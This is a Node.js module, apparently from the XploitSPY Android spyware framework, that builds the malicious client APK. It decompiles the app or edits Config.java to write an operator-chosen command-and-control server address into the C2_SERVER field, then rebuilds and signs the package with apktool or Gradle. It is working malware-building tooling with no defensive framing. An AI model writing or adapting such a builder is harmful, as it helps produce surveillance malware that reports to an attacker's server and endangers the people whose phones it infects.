const
    cp = require('child_process'),
    fs = require('fs'),
    path = require('path'),
    CONST = require('./const');

/**
 * 检查Java是否已安装
 */
function checkJava(callback) {
    let spawn = cp.spawn('java', ['-version']);
    spawn.on('error', (err) => callback("Java未安装", null));
    spawn.stderr.on('data', (data) => {
        spawn.removeAllListeners();
        spawn.stderr.removeAllListeners();
        return callback(null, "Java已安装");
    });
}

/**
 * 获取Android SDK路径
 * 支持多种常见安装位置
 */
function getAndroidSdkPath() {
    // 首先检查环境变量
    if (process.env.ANDROID_HOME) {
        return process.env.ANDROID_HOME;
    }
    if (process.env.ANDROID_SDK) {
        return process.env.ANDROID_SDK;
    }
    
    // 常见Linux安装路径
    const commonPaths = [
        '/opt/android-sdk',
        '/usr/local/android-sdk',
        '/home/android-sdk',
        path.join(require('os').homedir(), 'Android/Sdk'),
        path.join(require('os').homedir(), 'android-sdk'),
        '/var/lib/android-sdk'
    ];
    
    for (const sdkPath of commonPaths) {
        if (fs.existsSync(sdkPath)) {
            return sdkPath;
        }
    }
    
    return null;
}

/**
 * 检查是否可以使用ApkTool方案（无需Android SDK）
 */
function canUseApkTool() {
    return fs.existsSync(CONST.apkTool);
}

/**
 * 重新反编译APK（确保decompiled目录是最新的）
 * @param {function} callback - 回调函数
 */
function recompileAPK(callback) {
    console.log('重新反编译APK...');
    
    // 删除旧的decompiled目录
    if (fs.existsSync(CONST.smaliPath)) {
        try {
            fs.rmSync(CONST.smaliPath, { recursive: true, force: true });
        } catch (e) {
            console.log('删除旧目录警告:', e.message);
        }
    }
    
    // 找到源APK文件
    const sourceApk = path.join(__dirname, '../app/factory/app-release.apk');
    if (!fs.existsSync(sourceApk)) {
        return callback('未找到源APK文件: ' + sourceApk);
    }
    
    // 执行反编译
    const apktoolCmd = `java -jar "${CONST.apkTool}" d -f -o "${CONST.smaliPath}" "${sourceApk}"`;
    
    cp.exec(apktoolCmd, { timeout: 120000 }, (error, stdout, stderr) => {
        if (error) {
            console.log('反编译输出:', stdout);
            console.log('反编译错误:', stderr);
            return callback('反编译APK失败: ' + error.message);
        }
        
        console.log('APK反编译成功');
        return callback(false);
    });
}

/**
 * 递归查找包含服务器地址的smali文件
 * @param {string} dir - 搜索目录
 * @returns {string|null} - 找到的文件路径或null
 */
function findSmaliWithServerUrl(dir) {
    const files = fs.readdirSync(dir);
    
    for (const file of files) {
        const fullPath = path.join(dir, file);
        const stat = fs.statSync(fullPath);
        
        if (stat.isDirectory()) {
            const result = findSmaliWithServerUrl(fullPath);
            if (result) return result;
        } else if (file.endsWith('.smali')) {
            const content = fs.readFileSync(fullPath, 'utf8');
            // 查找包含http://模式的行
            if (/http:\/\/[^"\s]+/.test(content)) {
                return fullPath;
            }
        }
    }
    
    return null;
}

/**
 * 使用ApkTool修改smali文件中的服务器地址（无需Android SDK）
 * @param {string} URI - 服务器地址
 * @param {string} PORT - 服务器端口
 * @param {function} callback - 回调函数
 */
function patchApkTool(URI, PORT, callback) {
    // 首先尝试已知位置
    const smaliBasePath = path.join(CONST.smaliPath, 'smali');
    const configSmaliPath = path.join(smaliBasePath, 'com/remote/app/Config.smali');
    const iosocketSmaliPath = path.join(smaliBasePath, 'com/remote/app/IOSocket.smali');
    
    let targetFile = null;
    let patchPattern = /http:\/\/[^"\s]+/;  // 通用HTTP URL匹配
    let replacementMode = 'simple';  // simple 或 const-string
    
    // 检测使用哪个文件
    if (fs.existsSync(configSmaliPath)) {
        targetFile = configSmaliPath;
        patchPattern = /const-string v\d+, "http:\/\/[^"]*"/;
        replacementMode = 'const-string';
    } else if (fs.existsSync(iosocketSmaliPath)) {
        targetFile = iosocketSmaliPath;
    } else {
        // 自动搜索任何包含http://的smali文件
        console.log('正在搜索包含服务器地址的smali文件...');
        targetFile = findSmaliWithServerUrl(smaliBasePath);
        
        if (!targetFile) {
            // 如果找不到，可能是decompiled目录损坏或不完整
            // 重新反编译APK
            return recompileAPK((err) => {
                if (err) return callback(err);
                
                // 重新搜索
                console.log('重新搜索smali文件...');
                targetFile = findSmaliWithServerUrl(smaliBasePath);
                
                if (!targetFile) {
                    return callback('重新反编译后仍未找到包含服务器地址的smali文件');
                }
                
                // 继续处理
                const content = fs.readFileSync(targetFile, 'utf8');
                if (/const-string v\d+, "http:\/\/[^"]*"/.test(content)) {
                    patchPattern = /const-string v\d+, "http:\/\/[^"]*"/;
                    replacementMode = 'const-string';
                }
                
                console.log('找到目标文件:', targetFile);
                
                fs.readFile(targetFile, 'utf8', function (err, data) {
                    if (err) return callback('读取smali文件失败: ' + err.message);
                    
                    const serverUrl = `http://${URI}:${PORT}`;
                    
                    let result;
                    if (replacementMode === 'const-string') {
                        result = data.replace(patchPattern, `const-string v0, "${serverUrl}"`);
                    } else {
                        result = data.replace(patchPattern, serverUrl);
                    }
                    
                    if (result === data) {
                        return callback('未能在smali文件中找到服务器地址模式');
                    }
                    
                    fs.writeFile(targetFile, result, 'utf8', function (err) {
                        if (err) return callback('写入smali文件失败: ' + err.message);
                        console.log('已修补smali文件:', targetFile);
                        return callback(false);
                    });
                });
            });
        }
        
        // 检查是否是const-string模式
        const content = fs.readFileSync(targetFile, 'utf8');
        if (/const-string v\d+, "http:\/\/[^"]*"/.test(content)) {
            patchPattern = /const-string v\d+, "http:\/\/[^"]*"/;
            replacementMode = 'const-string';
        }
    }
    
    console.log('找到目标文件:', targetFile);
    
    fs.readFile(targetFile, 'utf8', function (err, data) {
        if (err) return callback('读取smali文件失败: ' + err.message);
        
        const serverUrl = `http://${URI}:${PORT}`;
        
        let result;
        if (replacementMode === 'const-string') {
            // 新版模式：替换const-string
            result = data.replace(patchPattern, `const-string v0, "${serverUrl}"`);
        } else {
            // 旧版模式：直接替换URL
            result = data.replace(patchPattern, serverUrl);
        }
        
        // 检查是否真的替换了
        if (result === data) {
            return callback('未能在smali文件中找到服务器地址模式');
        }
        
        fs.writeFile(targetFile, result, 'utf8', function (err) {
            if (err) return callback('写入smali文件失败: ' + err.message);
            console.log('已修补smali文件:', targetFile);
            return callback(false);
        });
    });
}

/**
 * 使用ApkTool构建APK（无需Android SDK）
 * @param {function} cb - 回调函数
 */
function buildWithApkTool(cb) {
    checkJava(function (err) {
        if (err) return cb(err);
        
        console.log('使用ApkTool方案构建（无需Android SDK）...');
        
        // 执行ApkTool构建
        cp.exec(CONST.apktoolBuildCommand, { timeout: 300000 }, (error, stdout, stderr) => {
            if (error) {
                console.log('ApkTool构建输出:', stdout);
                console.log('ApkTool构建错误:', stderr);
                return cb('ApkTool构建失败: ' + error.message);
            }
            
            console.log('ApkTool构建成功');
            
            // 检查APK是否存在
            if (!fs.existsSync(CONST.apkBuildPath)) {
                return cb('未找到构建的APK文件: ' + CONST.apkBuildPath);
            }
            
            // 签名APK
            cp.exec(CONST.apktoolSignCommand, (signError, signStdout, signStderr) => {
                if (signError) {
                    console.log('签名输出:', signStdout);
                    console.log('签名错误:', signStderr);
                    return cb('APK签名失败: ' + signError.message);
                }
                
                console.log('APK签名成功');
                return cb(false);
            });
        });
    });
}

/**
 * 设置local.properties中的SDK路径（Gradle方案）
 */
function setupLocalProperties(cb) {
    const sdkPath = getAndroidSdkPath();
    if (!sdkPath) {
        return cb('未找到Android SDK');
    }
    
    const localPropertiesPath = path.join(CONST.clientPath, 'local.properties');
    const content = `## 此文件由XploitSPY自动生成，请勿手动修改
sdk.dir=${sdkPath}
`;
    
    fs.writeFile(localPropertiesPath, content, 'utf8', (err) => {
        if (err) return cb('写入local.properties失败: ' + err.message);
        console.log('已设置Android SDK路径:', sdkPath);
        return cb(false);
    });
}

/**
 * 修改Config.java中的C2服务器地址（Gradle方案）
 * @param {string} URI - 服务器地址
 * @param {string} PORT - 服务器端口
 * @param {function} cb - 回调函数
 */
function patchConfig(URI, PORT, cb) {
    fs.readFile(CONST.configFilePath, 'utf8', function (err, data) {
        if (err) return cb('读取Config.java失败: ' + err.message);
        
        const serverUrl = `http://${URI}:${PORT}`;
        
        // 替换C2_SERVER的值
        const pattern = /public static String C2_SERVER\s*=\s*"[^"]*";/;
        const replacement = `public static String C2_SERVER = "${serverUrl}";`;
        
        if (!pattern.test(data)) {
            return cb('Config.java中未找到C2_SERVER定义');
        }
        
        const result = data.replace(pattern, replacement);
        
        fs.writeFile(CONST.configFilePath, result, 'utf8', function (err) {
            if (err) return cb('写入Config.java失败: ' + err.message);
            return cb(false);
        });
    });
}

/**
 * 使用Gradle构建APK（需要Android SDK）
 * @param {function} cb - 回调函数
 */
function buildWithGradle(cb) {
    checkJava(function (err) {
        if (err) return cb(err);
        
        const sdkPath = getAndroidSdkPath();
        if (!sdkPath) {
            return cb('未找到Android SDK，无法使用Gradle方案');
        }
        
        console.log('使用Gradle方案构建（需要Android SDK）...');
        
        const options = {
            cwd: CONST.clientPath,
            timeout: 300000,
            env: {
                ...process.env,
                ANDROID_HOME: sdkPath,
                ANDROID_SDK: sdkPath
            }
        };
        
        cp.exec(CONST.gradleBuildCommand, options, (error, stdout, stderr) => {
            if (error) {
                console.log('Gradle构建输出:', stdout);
                console.log('Gradle构建错误:', stderr);
                return cb('Gradle构建失败: ' + error.message);
            }
            
            console.log('Gradle构建成功');
            
            if (!fs.existsSync(CONST.apkUnsignedPath)) {
                return cb('未找到构建的APK文件: ' + CONST.apkUnsignedPath);
            }
            
            cp.exec(CONST.gradleSignCommand, (signError, signStdout, signStderr) => {
                if (signError) {
                    console.log('签名输出:', signStdout);
                    console.log('签名错误:', signStderr);
                    return cb('APK签名失败: ' + signError.message);
                }
                
                // 重命名签名后的APK
                const signedApkPath = path.join(CONST.apkOutputPath, 'app-release-aligned-signed.apk');
                if (fs.existsSync(signedApkPath)) {
                    fs.renameSync(signedApkPath, CONST.apkSignedBuildPath);
                }
                
                return cb(false);
            });
        });
    });
}

/**
 * 智能构建APK - 自动选择最佳方案
 * @param {string} URI - 服务器地址
 * @param {string} PORT - 服务器端口
 * @param {function} cb - 回调函数
 */
function buildAPK(URI, PORT, cb) {
    // 判断使用哪种方案
    const hasAndroidSdk = getAndroidSdkPath() !== null;
    const hasApkTool = canUseApkTool();
    
    console.log('构建方案检测:');
    console.log('  - Android SDK:', hasAndroidSdk ? '存在' : '不存在');
    console.log('  - ApkTool:', hasApkTool ? '存在' : '不存在');
    
    if (hasAndroidSdk) {
        // 优先使用Gradle方案（更现代，支持Android 14）
        console.log('选择: Gradle方案（推荐，支持Android 14）');
        setupLocalProperties((err) => {
            if (err) {
                // Gradle设置失败，回退到ApkTool
                if (hasApkTool) {
                    console.log('Gradle设置失败，回退到ApkTool方案...');
                    return buildApkToolFull(URI, PORT, cb);
                }
                return cb(err);
            }
            
            patchConfig(URI, PORT, (err) => {
                if (err) {
                    if (hasApkTool) {
                        console.log('Config.java修补失败，回退到ApkTool方案...');
                        return buildApkToolFull(URI, PORT, cb);
                    }
                    return cb(err);
                }
                
                buildWithGradle(cb);
            });
        });
    } else if (hasApkTool) {
        // 使用ApkTool方案
        console.log('选择: ApkTool方案（无需Android SDK）');
        buildApkToolFull(URI, PORT, cb);
    } else {
        return cb('未找到可用的构建方案。请安装Android SDK（用于Gradle方案）或确保apktool.jar和decompiled目录存在（用于ApkTool方案）');
    }
}

/**
 * 完整的ApkTool构建流程
 */
function buildApkToolFull(URI, PORT, cb) {
    patchApkTool(URI, PORT, (err) => {
        if (err) return cb(err);
        buildWithApkTool(cb);
    });
}

/**
 * 清理构建缓存
 */
function cleanBuild(cb) {
    // 清理Gradle
    if (fs.existsSync(CONST.gradlePath)) {
        const options = {
            cwd: CONST.clientPath,
            timeout: 60000
        };
        cp.exec(`${CONST.gradlePath} clean`, options, (error) => {
            if (error) console.log('Gradle清理警告:', error.message);
        });
    }
    
    // 清理ApkTool输出
    if (fs.existsSync(CONST.apkBuildPath)) {
        fs.unlinkSync(CONST.apkBuildPath);
    }
    
    return cb(false);
}

module.exports = {
    buildAPK,
    patchConfig,
    patchApkTool,
    cleanBuild,
    getAndroidSdkPath,
    canUseApkTool,
    // 保持向后兼容
    patchAPK: patchConfig,
    buildAPKFull: buildAPK
};
